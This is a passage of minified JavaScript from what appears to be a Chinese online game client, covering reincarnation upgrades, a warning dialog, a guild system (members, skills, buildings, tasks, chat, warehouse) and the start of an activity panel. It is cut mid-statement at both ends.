h.TipsCT.ins().showTips(gettext("转生等级已满"));var i=this.getBytes(1);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendZsUpgrade=function(){this.sendBaseProto(2)},e.prototype.canUpgrade=function(){var t=s.GlobalConfig.ZhuanShengStageConfig[this.stage];return t?this.exp>=t.needExp&&a.ActorCC.level>=t.needLevel:!1},e.prototype.canUpgrade2=function(){var t=s.GlobalConfig.ZhuanShengStageConfig[this.lv];return t?!0:!1},e.prototype.sendZsSetAttr=function(t){var e=this.getBytes(6);e.writeShort(t.length);for(var i=0;i<t.length;i++)e.writeShort(t[i].id),e.writeInt(t[i].count);this.sendToServer(e)},e.prototype.sendZsReset=function(){var t=this.getBytes(7);this.sendToServer(t)},e.prototype.checkOpen=function(t){void 0===t&&(t=!1);var e=s.GlobalConfig.ZhuanShengConfig,i="";return a.ActorCC.level<e.level&&(i=gettext("{0}级开启转生",e.level)),t&&""!=i&&h.TipsCT.ins().showTips(i),""==i},e.prototype.getAddPoint=function(){for(var t=s.GlobalConfig.ZhuanShengConfig,e=t.attrPoint*this.lv,i=0;i<this.attr.length;i++)e-=this.attr[i].count;return e},__decorate([post()],e.prototype,"postZsData",null),__decorate([post()],e.prototype,"postZsLv",null),e}(n.BaseSystem);e.ZsCT=p,window.ZsCT=p,__reflect(p.prototype,"ZsCT",[]),Systemap.ZsCT=function(){return p.ins()},window.ZsCT=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarnWin=void 0;var n=i(5),o=i(1),s=i(63),a=function(t){function e(){var e=t.call(this)||this;return e.rectClose=!1,e._sn_="warnFrameSkin",e}return __extends(e,t),e.show=function(t,e,i,n,o,a,r,l,h,u){void 0===n&&(n=null),void 0===o&&(o=null),void 0===a&&(a="normal"),void 0===r&&(r="center"),void 0===l&&(l=!1),void 0===h&&(h=null),void 0===u&&(u=null);var p=s.WarnCT.ins().setWarnLabel(t,{func:e,thisObj:i},{func2:n,thisObj2:o},a,r,l,{func3:h,thisObj3:u});return p},e.show2=function(t,e,i,n,o,a,r,l,h,u,p,d,c){void 0===n&&(n=null),void 0===a&&(a=null),void 0===r&&(r=null),void 0===l&&(l=null),void 0===h&&(h=null),void 0===u&&(u=null),void 0===p&&(p="normal"),void 0===d&&(d="center"),void 0===c&&(c=!1);var f=s.WarnCT.ins().setWarnLabel2(t,{func:e,thisObj:i},{func2:n,thisObj2:o},a,r,{title:l,notBtnLab:h,sureBtnLab:u},p,d);return f},e.show3=function(t,e,i,n,o,a,r,l,h,u,p){void 0===o&&(o=null),void 0===a&&(a=null),void 0===r&&(r="normal"),void 0===l&&(l="center"),void 0===h&&(h=!1),void 0===u&&(u=null),void 0===p&&(p=null);var d=s.WarnCT.ins().setWarnLabel3(t,e,{func:i,thisObj:n},{func2:o,thisObj2:a},r,l,h,{func3:u,thisObj3:p});return d},e.prototype.showUI=function(t,e,i,n){console.log(""),this.leftGroup.visible=!1,this.icon1.visible=!1,this.label1.visible=!1,this.rightGroup.visible=!1,this.icon2.visible=!1,this.label2.visible=!1,(t||e)&&(this.leftGroup.visible=!0,t&&(this.icon1.visible=!0,this.icon1.source=t),e&&(this.label1.visible=!0,this.label1.text=e)),(i||n)&&(this.rightGroup.visible=!0,i&&(this.icon2.visible=!0,this.icon2.source=i),n&&(this.label2.visible=!0,this.label2.text=n))},e.prototype.skinComplete=function(){this.setBtnLabel(this.leftTxt,this.rightTxt),!!this.warnStr&&(this.warnLabel.textFlow=n.TextFlowMaker.generateTextFlow(this.warnStr)),!!this.warnAlign&&(this.warnLabel.textAlign=this.warnAlign),this.txt_icon.visible=!1,this.warnStrArr&&this.warnStrArr.length>1&&(this.warnLabel0.textFlow=n.TextFlowMaker.generateTextFlow(this.warnStrArr[0]),this.warnLabel1.textFlow=n.TextFlowMaker.generateTextFlow(this.warnStrArr[2]),this.warnLabel2.textFlow=n.TextFlowMaker.generateTextFlow(this.warnStrArr[1]),this.icon_money.source=this.iconPath[0],this.txt_icon.visible=!0,this.warnLabel.textFlow=n.TextFlowMaker.generateTextFlow(this.warnStr))},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.sureBtn,this.onTap),this.addTouchEvent(this.notBtn,this.onTap),this.addTouchEvent(this.cbx,this.onTap),this.cbx.selected=t?t[0]:!1,this.changeLabShow(),this.updateTime()},e.prototype.updateTime=function(){var t=this;this.timeNum&&(this.timeLab.textFlow=(new egret.HtmlTextParser).parse("<a color=#20cb30>"+this.timeNum+"</a>"+this.timeStr),Timer.start(1e3,this.timeNum,function(){t.timeNum--,t.timeLab.textFlow=(new egret.HtmlTextParser).parse("<a color=#20cb30>"+t.timeNum+"</a>"+t.timeStr),t.timeNum<=0&&null!=t.callBack.func&&(t.callBack.func.call(t.callBack.thisObj),win.close("WarnWin"))},this))},e.prototype.changeLabShow=function(){var t,e,i;(null===(t=this.labDic)||void 0===t?void 0:t.title)&&(this.title.text=this.labDic.title),(null===(e=this.labDic)||void 0===e?void 0:e.notBtnLab)&&(this.notBtn.label=this.labDic.notBtnLab),(null===(i=this.labDic)||void 0===i?void 0:i.sureBtnLab)&&(this.sureBtn.label=this.labDic.sureBtnLab)},e.prototype.onTap=function(t){var e,i,n;switch(t.currentTarget){case this.sureBtn:null!=(null===(e=this.callBack)||void 0===e?void 0:e.func)&&this.callBack.func.call(this.callBack.thisObj);break;case this.notBtn:(null===(i=this.calback2)||void 0===i?void 0:i.func2)&&this.calback2.func2.call(this.calback2.thisObj2);break;case this.cbx:(null===(n=this.calback3)||void 0===n?void 0:n.func3)&&this.calback3.func3.call(this.calback3.thisObj3,this.cbx.selected)}t.currentTarget!=this.cbx&&win.close("WarnWin")},Object.defineProperty(e.prototype,"isShowWin",{get:function(){return this._isShowWin},set:function(t){this._isShowWin!=t&&(this._isShowWin=t)},enumerable:!1,configurable:!0}),e.prototype.setWarnLabel=function(t,e,i,o,s,a){void 0===o&&(o="normal"),void 0===s&&(s="left"),this.warnStr=t,this.warnLabel&&(this.warnLabel.textFlow=n.TextFlowMaker.generateTextFlow(t)),this.callBack=e,this.calback2=i,this.currentState=o,this.txt_icon&&(this.txt_icon.visible=!1),this.warnAlign=s,this.warnLabel&&(this.warnLabel.textAlign=s),this.calback3=a},e.prototype.setWarnLabel2=function(t,e,i,n,o,s,a,r){void 0===n&&(n=0),void 0===o&&(o=""),void 0===a&&(a="normal"),void 0===r&&(r="left"),this.warnStr=t,this.callBack=e,this.calback2=i,this.timeNum=n,this.timeStr=o,this.labDic=s,this.currentState=a,this.warnAlign=r,this.warnLabel&&(this.warnLabel.textAlign=r)},e.prototype.setWarnLabel3=function(t,e,i,o,s,a,r){void 0===s&&(s="normal"),void 0===a&&(a="left"),this.warnStrArr=t,this.warnStr="",this.iconPath=e,this.txt_icon&&(this.txt_icon.visible=!0),this.warnLabel&&(this.warnLabel.textFlow=n.TextFlowMaker.generateTextFlow("")),this.callBack=i,this.calback2=o,this.currentState=s,this.warnAlign=a,this.warnLabel&&(this.warnLabel.textAlign=a),this.calback3=r},e.prototype.setBtnLabel=function(t,e){this.leftTxt=t,this.rightTxt=e,this.sureBtn&&(t&&(this.sureBtn.label=t),e&&(this.notBtn.label=e))},e}(o.BaseView);e.WarnWin=a,window.WarnWin=a,__reflect(a.prototype,"WarnWin",[]),window.WarnWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Guild=void 0;var n=i(55),o=i(8),s=i(42),a=i(14),r=i(0),l=i(4),h=i(6),u=i(10),p=i(45),d=i(120),c=i(23),f=i(2),g=i(159),m=i(106),v=i(107),y=i(292),C=i(212),T=i(136),b=i(182),w=i(638),I=i(639),_=i(640),S=i(26),x=i(78),D=function(t){function e(){var e=t.call(this)||this;return e.guildID=0,e.guildName="",e.guildLv=0,e._buildingLevels=[],e.money=0,e.notice="",e.records=[],e.guildListInfos=[],e._guildMembers=[],e.applyGuilds=[],e._guillRoleSkillInfo=[],e.guildTaskInfos=new eui.ArrayCollection,e.isFirstGetMessageInfo=!0,e._memberSortType=0,e.pageMax=1,e.hasApply=!1,e.changeNameNum=0,e.hasNewMsg=!1,e.equitScore=0,e.hzName="",e.sendToFireCount=[],e.isAuto=1,e.attrLimit=0,e._conCount=[],e.sysId=PackageID.Guild,e.regNetMsg(1,e.postGuildInfo),e.regNetMsg(2,e.postGuildMembers),e.regNetMsg(3,e.postGuildList),e.regNetMsg(4,e.postGuildCreate),e.regNetMsg(6,e.postJoinGuild),e.regNetMsg(7,e.postApplyInfos),e.regNetMsg(8,e.postProcessJoin),e.regNetMsg(9,e.doChangeOffice),e.regNetMsg(11,e.postQuitGuild),e.regNetMsg(12,e.doUpdateGuildInfo),e.regNetMsg(13,e.postGuildMoney),e.regNetMsg(14,e.postChangeNotice),e.regNetMsg(15,e.doGuildSkillInfo),e.regNetMsg(16,e.postLearnGuildSkill),e.regNetMsg(17,e.postUpBuilding),e.regNetMsg(18,e.doPracticeGuildSkill),e.regNetMsg(19,e.doGuildTaskInfos),e.regNetMsg(20,e.doGuildTaskUpdate),e.regNetMsg(22,e.postManageList),e.regNetMsg(23,e.doManage),e.regNetMsg(24,e.postConCount),e.regNetMsg(25,e.postMyGuildInfo),e.regNetMsg(26,e.doGuildMessage),e.regNetMsg(27,e.postAllGuildMessage),e.regNetMsg(28,e.doAddGuildlimit),e.regNetMsg(30,e.postUpdateFire),observe(e,e.postGuildWarehouse,Ts.GuildWarehouse.guildEquit),observe(e,e.startCheckShow,Ts.enterScene.enterOK),observe(e,e.setGuild,c.GameLogic.ins().postGuildChange),e}return __extends(e,t),e.prototype.initLogin=function(){this.guildMessageInfoData||(this.guildMessageInfoData=new eui.ArrayCollection),this.guildMessageInfoData.removeAll(),this.isFirstGetMessageInfo=!0,this.sendGuildInfo(),this.sendMyGuildInfo()},e.prototype.setGuild=function(t){var e=t[0],i=t[1];this.guildID!=e&&(this.guildID=e,this.guildName=i,this.sendGuildInfo(),0!=this.guildID)},e.ins=function(){return t.ins.call(this)},e.prototype.getSkllInfoByIndex=function(t){return this._guillRoleSkillInfo[t]},e.prototype.getGuildMembersByIndex=function(t){return this._guildMembers[t]},e.prototype.getGuildTaskInfosByIndex=function(t){return this.guildTaskInfos.getItemAt(t)},e.prototype.getBuildingLevels=function(t){return void 0===t&&(t=-1),-1==t?this._buildingLevels:this._buildingLevels[t]},e.prototype.getConCount=function(t){return void 0===t&&(t=-1),-1==t?this._conCount:this._conCount[t]},e.prototype.sendGuildInfo=function(){this.sendBaseProto(1)},e.prototype.postGuildInfo=function(t){if(this._buildingLevels=[],1==t.readByte()){this.guildID=t.readInt(),this.guildName=t.readString();for(var e=t.readUnsignedByte(),i=0;e>i;i++)this._buildingLevels.push(t.readUnsignedByte());return this.money=t.readInt(),this.notice=t.readString(),this.doAddGuildlimit(t),this.guildLv=this._buildingLevels[0],this.sendGuildMembers(),this.sendGuildSkillInfo(),this.postUpdateFire(t),this.changeNameNum=t.readInt(),this.hzName=t.readString(),[this.guildID,this.guildName]}return null},e.prototype.sendGuildMembers=function(){this.sendBaseProto(2)},e.prototype.postGuildMembers=function(t){var e=t.readInt();this._guildMembers=[];for(var i=0;e>i;i++){var n=new T.GuildMemberInfo;n.roleID=t.readInt(),n.name=t.readString(),n.office=t.readUnsignedByte(),n.office==m.GuildLanguage.guildOffice.length&&(this.guildMaster=n),n.office==m.GuildLanguage.guildOffice.length-1&&(this.deputyMaster=n),n.job=t.readUnsignedByte(),n.sex=t.readUnsignedByte(),n.vipLevel=t.readInt(),n.monthCard=t.readUnsignedByte(),n.contribution=t.readInt(),n.curContribution=t.readInt(),n.attack=t.readDouble(),n.downTime=t.readUnsignedInt(),n.level=t.readInt(),n.zsLevel=t.readInt(),this._guildMembers.push(n)}},e.prototype.sendGuildList=function(){this.sendBaseProto(3)},e.prototype.postGuildList=function(t){this.guildListInfos=[];for(var e=t.readInt(),i=0;e>i;i++){var n=new C.GuildListInfo;n.guildRank=i+1,n.guildID=t.readUnsignedInt(),n.guildLevel=t.readUnsignedByte(),n.commentLv=t.readUnsignedByte(),n.guildMember=t.readInt(),n.guildName=t.readString(),n.guildPresident=t.readString(),n.attr=t.readInt(),this.guildListInfos.push(n)}},e.prototype.sendGuildCreate=function(t,e){return __awaiter(this,void 0,void 0,function(){var i,n,o;return __generator(this,function(s){switch(s.label){case 0:return i=0,p.ChatCT.ins().isCheckStr()?[4,platform.checkStr(e,3)]:[3,2];case 1:n=s.sent().content,e=n,s.label=2;case 2:return o=this.getBytes(4),o.writeByte(t),o.writeString(e),o.writeByte(i),this.sendToServer(o),[2]}})})},e.prototype.postGuildCreate=function(t){var e=t.readUnsignedByte();return 0==e?(this.guildID=t.readUnsignedInt(),f.TipsCT.ins().showTips(gettext("公会创建成功")),this.sendGuildInfo(),!0):!1},e.prototype.sendQuitGuild=function(){return x.DominateWorldCT.ins().fbSwitch?void f.TipsCT.ins().showTips(gettext("争霸中，不允许退出")):void this.sendBaseProto(5)},e.prototype.sendJoinGuild=function(t){var e=this.getBytes(6);e.writeInt(t),this.sendToServer(e)},e.prototype.postJoinGuild=function(t){this.hasApply=!0},e.prototype.sendApplyInfos=function(){this.sendBaseProto(7)},e.prototype.postApplyInfos=function(t){for(var e=t.readInt(),i=[],n=0;e>n;n++){var o=new y.GuildApplyInfo;o.roleID=t.readInt(),o.vipLevel=t.readInt(),o.job=t.readUnsignedByte(),o.sex=t.readUnsignedByte(),o.attack=t.readDouble(),o.name=t.readString(),i.push(o)}return this.hasApply=e>0,i},e.prototype.sendProcessJoin=function(t,e){var i=this.getBytes(8);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postProcessJoin=function(t){var e=t.readUnsignedInt(),i=t.readUnsignedByte(),n=this.applyGuilds,o=n.indexOf(e);return-1!=o&&0==i&&n.splice(o,1),1==i?!0:!1},e.prototype.sendChangeOffice=function(t,e){var i=this.getBytes(9);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.doChangeOffice=function(t){for(var e=t.readInt(),i=t.readUnsignedByte(),n=0;n<this._guildMembers.length;n++){var o=this.getGuildMembersByIndex(n);if(o.roleID==e)return void(o.office=i)}},e.prototype.sendDemise=function(){this.sendBaseProto(10)},e.prototype.sendKick=function(t){if(x.DominateWorldCT.ins().fbSwitch)return void f.TipsCT.ins().showTips(gettext("争霸中，不允许踢出"));var e=this.getBytes(11);e.writeInt(t),this.sendToServer(e)},e.prototype.postQuitGuild=function(t){var e=t.readInt();return e==l.ActorCC.actorID?(this.clearGuildInfo(),!0):!1},e.prototype.doUpdateGuildInfo=function(t){var e=t.readUnsignedByte();switch(e){case 1:break;case 2:this.sendGuildInfo();break;case 3:this.sendGuildMembers();break;case 4:break;case 5:this.sendApplyInfos();break;case 6:}},e.prototype.sendCon=function(t){var e=this.getBytes(13);e.writeInt(t),this.sendToServer(e)},e.prototype.postGuildMoney=function(t){this.money=t.readInt()},e.prototype.sendChangeNotice=function(t){var e=this.getBytes(14);e.writeString(t),this.sendToServer(e)},e.prototype.postChangeNotice=function(t){var e=t.readUnsignedByte();0==e&&(this.notice=t.readString())},e.prototype.sendGuildSkillInfo=function(){this.sendBaseProto(15)},e.prototype.doGuildSkillInfo=function(t){var e=t.readUnsignedByte();this._guillRoleSkillInfo=[];for(var i=0;e>i;i++){for(var n=new _.GuildRoleSkillInfo,o=t.readUnsignedByte(),s=0;o>s;s++){var a=new w.GuildSkillInfo;a.level=t.readInt(),n.guildSkillInfo.push(a)}o=t.readUnsignedByte();for(var r=0;o>r;r++){var a=(o[r],new w.GuildSkillInfo);a.level=t.readInt(),a.exp=t.readInt(),n.practiceSkillInfo.push(a)}this._guillRoleSkillInfo.push(n)}this.postGuildSkillInfo()},e.prototype.postGuildSkillInfo=function(){},e.prototype.sendLearnGuildSkill=function(t,e){var i=this.getBytes(16);i.writeShort(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postLearnGuildSkill=function(t){var e=t.readShort(),i=t.readUnsignedByte();this.getSkllInfoByIndex(e).guildSkillInfo[i-1].level=t.readInt(),this.postGuildSkillInfo(),f.TipsCT.ins().showTips(gettext("升级成功"))},e.prototype.sendPracticeGuildSkill=function(t,e){var i=this.getBytes(18);i.writeShort(t),i.writeByte(e),this.sendToServer(i)},e.prototype.doPracticeGuildSkill=function(t){var e=t.readShort(),i=t.readUnsignedByte();
this.getSkllInfoByIndex(e).practiceSkillInfo[i-1].level=t.readInt(),this.getSkllInfoByIndex(e).practiceSkillInfo[i-1].exp=t.readInt();var n=t.readInt();this.postGuildSkillInfo(),f.TipsCT.ins().showTips(gettext("|C:0x23CA23&T:修炼值 +{0}|",n))},e.prototype.sendUpBuilding=function(t){var e=this.getBytes(17);e.writeByte(t),this.sendToServer(e)},e.prototype.postUpBuilding=function(t){var e=t.readByte();this._buildingLevels[e-1]=t.readByte(),this.guildLv=this._buildingLevels[0]},e.prototype.doGuildTaskInfos=function(t){this.guildTaskInfos.removeAll(),this.initTaskInfos();for(var e=t.readInt(),i=0;e>i;i++){var n=new I.GuildTaskInfo;n.taskID=t.readInt(),n.param=t.readInt(),n.state=t.readInt(),n.stdTask=r.GlobalConfig.GuildTaskConfig[n.taskID],this.guildTaskInfos.addItem(n)}this.updateTaskList()},e.prototype.postGuildTaskUpdate=function(){},e.prototype.doGuildTaskUpdate=function(t){for(var e=t.readInt(),i=t.readInt(),n=t.readInt(),o=0;o<this.guildTaskInfos.length;o++){var s=this.guildTaskInfos.getItemAt(o);if(s&&s.taskID==e){s.param=i,s.state=n;break}}this.updateTaskList()},e.prototype.updateTaskList=function(){for(var t=this.guildTaskInfos.source,e=t.length-1;e>=0;e--)0==t[e].stdTask.type&&t.splice(e,1);t.sort(this.taskInfosSortFunc),this.guildTaskInfos.replaceAll(t),this.postGuildTaskUpdate()},e.prototype.sendGetTaskAward=function(t){var e=this.getBytes(21);e.writeByte(t),this.sendToServer(e)},e.prototype.sendManageList=function(){this.sendBaseProto(22)},e.prototype.postManageList=function(t){this.records=[];for(var e=t.readInt(),i=0;e>i;i++)this.parserManage(t)},e.prototype.doManage=function(t){},e.prototype.sendConCount=function(){this.sendBaseProto(24)},e.prototype.postConCount=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++)this._conCount[i]=t.readInt()},e.prototype.sendMyGuildInfo=function(){this.sendBaseProto(25)},e.prototype.postMyGuildInfo=function(t){var e=t.readInt();0!=l.ActorCC.guildNum&&e!=l.ActorCC.guildNum&&f.TipsCT.ins().showTips(gettext("行会贡献X")+(e-l.ActorCC.guildNum)),l.ActorCC.guildNum=e,this.myTotalCon=t.readInt(),this.myOffice=t.readUnsignedByte()},e.prototype.sendGuildMessage=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n,o,s;return __generator(this,function(a){switch(a.label){case 0:return e=0,p.ChatCT.ins().isCheckStr()?[4,platform.checkStr(t,1,2)]:[3,2];case 1:i=a.sent(),n=i.result,o=i.content,e=2+("self"==n?1:0),t=o,a.label=2;case 2:return s=this.getBytes(26),s.writeString(t),s.writeByte(e),this.sendToServer(s),[2]}})})},e.prototype.doGuildMessage=function(t){var e=new b.GuildMessageInfo;if(e.parserMessage(t),this.guildMessageInfoData.length>=50){var i=this.guildMessageInfoData.removeItemAt(0);p.ChatCT.ins().removeAllChatMsg(i)}if(this.guildMessageInfoData.addItem(e),p.ChatCT.ins().insertAllChatMsg(e),p.ChatCT.ins().postNewChatMsg(e),1==e.type&&e.roleId!=l.ActorCC.actorID&&(this.hasNewMsg=!0),1==e.type){var i=new d.ChatInfoData(null);i.name=e.name,i.type=7,i.times=e.times,i.str=e.content,p.ChatCT.ins().postNewChatMsg(i)}2==e.type&&this.postGuildBossHaveRelive(!0,e.content)},e.prototype.postGetNewGuildMessage=function(t){return t},e.prototype.postGuildBossHaveRelive=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t},e.prototype.sendAllGuildMessage=function(){this.isFirstGetMessageInfo&&(this.isFirstGetMessageInfo=!1,this.sendBaseProto(27))},e.prototype.postAllGuildMessage=function(t){this.guildMessageInfoData.removeAll();for(var e=t.readInt(),i=0;e>i;i++){var n=new b.GuildMessageInfo;n.parserMessage(t),this.guildMessageInfoData.addItem(n),p.ChatCT.ins().insertAllChatMsg(n)}this.guildMessageInfoData.length&&p.ChatCT.ins().postNewChatMsg(this.guildMessageInfoData.getItemAt(this.guildMessageInfoData.length-1))},e.prototype.sendAddGuildLimit=function(t,e){var i=this.getBytes(28);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.doAddGuildlimit=function(t){this.isAuto=t.readUnsignedByte(),this.attrLimit=t.readInt()},e.prototype.sendToFire=function(t,e){var i=this.getBytes(30);i.writeShort(t),this.sendToServer(i),this.sendToFireCount.push([t,e])},e.prototype.postUpdateFire=function(t){this.fireDic=this.fireDic||{};var e=t.readShort(),i=t.readInt(),n=this.fireDic.fireLvl!=e||this.fireDic.fireVal!=i;if(this.fireDic.fireLvl=e,this.fireDic.fireVal=i,n)for(var o=r.GlobalConfig.GuildConfig,s=h.BagCT.ins().getBagItemById(o.bonfireItem),a=s?s.count:0,l=0;l<this.sendToFireCount.length;l++)if(a==this.sendToFireCount[l][1]){for(;l>=0;){var u=this.sendToFireCount.shift()[0];f.TipsCT.ins().showCenterTips(gettext("行会总篝火值 +{0} 个人行会贡献 +{1}",5*u,30*u)),l-=1}break}},e.prototype.sendGuildChangeName=function(t){var e=this.getBytes(31);e.writeString(t),this.sendToServer(e)},e.prototype.postGuildWarehouse=function(t){var e=t.equitScore,i=t.items;this.equitScore=e,this.guildItem=i,this.guildItem.sort(this.ItemSort)},e.prototype.ItemSort=function(t,e){var i=n.Algorithm.sortDesc(t.point,e.point);return 0==i&&(i=n.Algorithm.sortDesc(t.configID,e.configID)),i},e.prototype.sendUseWarehouse=function(t,e){var i=this.getBytes(37);i.writeByte(t),i.writeDouble(e),this.sendToServer(i)},e.prototype.parserManage=function(t){if(this.records){var e="",i=o.DateUtils.getFormatBySecond(.001*o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),8);i=s.StringUtils.complementByChar(i,16);var n=t.readUnsignedByte(),a=t.readInt(),l=t.readInt(),h=(t.readInt(),t.readString());t.readString();switch(n){case 1:e=gettext("{0} [{1}]加入",i,h);break;case 2:e=gettext("{0} [{1}]离开",i,h);break;case 3:e=gettext("{0} [{1}]被任命副会长",i,h);break;case 4:e=gettext("{0} [{1}]成为新的会长",i,h);break;case 5:e=gettext("{0} [{1}]发起弹劾",i,h);break;case 6:e=gettext("{0} [{1}]公会副本进度首通",i,h);break;case 7:e=gettext("{0} [{1}]捐献了",i,h)+l+(2==a?gettext("元宝"):gettext("金币"));break;case 8:e=gettext("{0}[{1}]把{2}升级到{3}级",i,h,r.GlobalConfig.GuildConfig.buildingNames[a-1],l);break;case 9:var p=r.GlobalConfig.ItemConfig[a],d=u.ItemUtil.getQuality2(p);e=gettext("{0}  [{1}]在公会商店获得了<font color={2}>{3}</font>",i,h,d,p.name);break;case 10:e=i+gettext("  <font color='#35e62d'>公会强盗已经全部击杀</font>");break;case 11:e=gettext("{0} [{1}]被降职了",i,h)}this.records.unshift(e)}},e.prototype.hasApplys=function(){return l.ActorCC.level<r.GlobalConfig.GuildConfig.openLevel?!1:this.myOffice>=v.GuildOffice.GUILD_FUBANGZHU&&this.hasApply},e.prototype.hasDonate=function(){if(l.ActorCC.level<r.GlobalConfig.GuildConfig.openLevel)return!1;var t=e.ins().guildID;if(0==t)return!1;var i=this.getConCount(),n=r.GlobalConfig.GuildDonateConfig;return!!n[2]&&!!n[2].count&&i[1]>0&&l.ActorCC.gold>=n[2].count},e.prototype.clearGuildInfo=function(){this.guildID=0,this.guildName="",this.guildListInfos=[],this._guildMembers=[],this.applyGuilds=[],this.pageMax=1,this.hasNewMsg=!1},e.prototype.removeMsgWithId=function(t){for(var e=[],i=0;i<this.guildMessageInfoData.length;i++){var n=this.guildMessageInfoData.getItemAt(i);n.roleId!=t&&e.push(n)}this.guildMessageInfoData.source=e,this.guildMessageInfoData.refresh()},e.prototype.initTaskInfos=function(){if(null==this.guildTaskInfos){var t=[],e=r.GlobalConfig.GuildTaskConfig;for(var i in e)if(e.hasOwnProperty(i)){var n=e[i],o=new I.GuildTaskInfo;o.taskID=n.id,o.param=0,o.state=0,o.stdTask=n,t.push(o)}this.guildTaskInfos.replaceAll(t)}},e.prototype.taskInfosSortFunc=function(t,e){if(t.state==e.state)return n.Algorithm.sortAsc(t.taskID,e.taskID);if(2==t.state)return 1;if(2==e.state)return-1;if(2!=t.state&&2!=e.state){if(t.taskID<e.taskID)return-1;if(t.taskID>e.taskID)return 1}return 0},e.prototype.getMemberNum=function(){return this._guildMembers.length},e.prototype.getGuildMembers=function(t){return 0==t||this._memberSortType==t?this._guildMembers:1==t?this._guildMembers.sort(this.memberSortFunc):2==t?this._guildMembers.sort(this.memberSortFunc2):this._guildMembers},e.prototype.getOfficeNum=function(t){for(var e=this._guildMembers.length,i=0,n=0;e>n;n++){var o=this._guildMembers[n];o.office==t&&i++}return i},e.prototype.canAppointFHZ=function(){return this.getOfficeNum(v.GuildOffice.GUILD_FUBANGZHU)<r.GlobalConfig.GuildConfig.posCounts[this.guildLv-1][1]},e.prototype.memberSortFunc=function(t,e){return t.office>e.office?-1:t.office<e.office?1:t.office==e.office?t.contribution==e.contribution?0:t.contribution>e.contribution?-1:1:0},e.prototype.memberSortFunc2=function(t,e){return t.curContribution==e.curContribution?0:t.curContribution>e.curContribution?-1:1},e.prototype.checkIsInGuild=function(t){for(var e in this._guildMembers){var i=this._guildMembers[e];if(i.roleID==t)return!0}return!1},e.prototype.startCheckShow=function(){},e.prototype.isUpGradeBuilding=function(){if(l.ActorCC.level<r.GlobalConfig.GuildConfig.openLevel)return!1;if(e.ins().myOffice<v.GuildOffice.GUILD_FUBANGZHU)return!1;for(var t=[g.GuildBuilding.GUILD_HALL,g.GuildBuilding.GUILD_SHOP,g.GuildBuilding.GUILD_COMMENT],i=0;i<t.length;i++){var n=t[i],o=e.ins().getBuildingLevels(n-1)||0,s=r.GlobalConfig.GuildLevelConfig[n],a=0,h=null,u=null,p=0;for(var d in s)if(s.hasOwnProperty(d)){var c=s[d];a=c.level>a?c.level:a,c.level==o&&(h=c),c.level==o+1&&(u=c)}if((h||u||n==g.GuildBuilding.GUILD_LIANGONGFANG)&&u&&a>o&&(p=u.upFund),!(n==g.GuildBuilding.GUILD_HALL&&o>=a||n!=g.GuildBuilding.GUILD_HALL&&o>=e.ins().guildLv||e.ins().money<p))return!0}return!1},e.prototype.getMemberByRoleId=function(t){for(var e in this._guildMembers)if(this._guildMembers[e].roleID==t)return this._guildMembers[e];return null},e.prototype.saveGuildEquip=function(t){this.sendUseWarehouse(0,t.handle)},e.prototype.takeGuildEquip=function(t){t.itemConfig.guild_depot_point>this.equitScore?f.TipsCT.ins().showTips(gettext("积分不足")):t.itemConfig.zsLevel&&S.ZsCT.ins().stage<t.itemConfig.zsLevel?f.TipsCT.ins().showTips(gettext("该装备需要{0}转才能取出",t.itemConfig.zsLevel)):t.itemConfig.level&&l.ActorCC.level<t.itemConfig.level?f.TipsCT.ins().showTips(gettext("该装备需要{0}级才能取出",t.itemConfig.level)):this.sendUseWarehouse(1,t.handle)},e.prototype.returnNoGuildRep=function(){return l.ActorCC.level<r.GlobalConfig.GuildConfig.openLevel?!1:0==e.ins().guildID?!0:!1},__decorate([post()],e.prototype,"postGuildInfo",null),__decorate([post()],e.prototype,"postGuildMembers",null),__decorate([post()],e.prototype,"postGuildList",null),__decorate([post()],e.prototype,"postGuildCreate",null),__decorate([post()],e.prototype,"postJoinGuild",null),__decorate([post()],e.prototype,"postApplyInfos",null),__decorate([post()],e.prototype,"postProcessJoin",null),__decorate([post()],e.prototype,"postQuitGuild",null),__decorate([post()],e.prototype,"postGuildMoney",null),__decorate([post()],e.prototype,"postChangeNotice",null),__decorate([post()],e.prototype,"postGuildSkillInfo",null),__decorate([post()],e.prototype,"postLearnGuildSkill",null),__decorate([post()],e.prototype,"postUpBuilding",null),__decorate([post()],e.prototype,"postGuildTaskUpdate",null),__decorate([post()],e.prototype,"postManageList",null),__decorate([post()],e.prototype,"postConCount",null),__decorate([post()],e.prototype,"postMyGuildInfo",null),__decorate([post()],e.prototype,"postGetNewGuildMessage",null),__decorate([post()],e.prototype,"postGuildBossHaveRelive",null),__decorate([post()],e.prototype,"postAllGuildMessage",null),__decorate([post()],e.prototype,"postUpdateFire",null),__decorate([post()],e.prototype,"postGuildWarehouse",null),e}(a.BaseSystem);e.Guild=D,window.Guild=D,__reflect(D.prototype,"Guild",[]),Systemap.Guild=function(){return D.ins()},window.Guild=D},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityPanel=void 0;var n=i(1),o=i(33),s=i(0),a=i(9),r=function(t){function e(){var e=t.call(this)||this;return e._activityBtnType=-1,e.activityType=o.ActivityType.Normal,e}return __extends(e,t),Object.defineProperty(e.prototype,"activityBtnType",{get:function(){return this._activityBtnType},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"activityID",{get:function(){return this._activityID},set:function(t){this._activityID=t;var e=s.GlobalConfig.ActivityConfig[t],i=s.GlobalConfig.ActivityBtnConfig[t];this.name=null===e||void 0===e?void 0:e.tabName,this.sTips=null===e||void 0===e?void 0:e.desc,this._activityBtnType=i.type},enumerable:!1,configurable:!0}),e.create=function(t,e){var i,n,o,a,r,l,h=s.GlobalConfig.ActivityBtnConfig[t];if(h&&!h.type){var u=ObjectPool.pop("OSATarget0Panel");return u.activityType=e,u.activityID=t,u}var 